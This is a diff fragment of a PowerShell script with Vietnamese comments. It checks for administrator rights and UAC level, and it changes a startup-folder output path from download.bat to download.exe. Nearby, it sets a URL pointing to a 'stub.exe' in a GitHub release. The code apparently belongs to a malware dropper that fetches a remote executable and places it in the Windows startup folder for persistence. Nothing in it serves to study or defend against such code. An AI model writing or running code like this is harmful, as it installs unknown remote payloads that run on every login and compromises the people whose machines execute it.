@@ -14,7 +14,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     try {
         # Tải xuống tệp batch
         
-        $outputFile = "$startupfolder\download.bat"
+        $outputFile = "$startupfolder\download.exe"
         
         # Kiểm tra mức độ UAC và in thông báo
         $url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
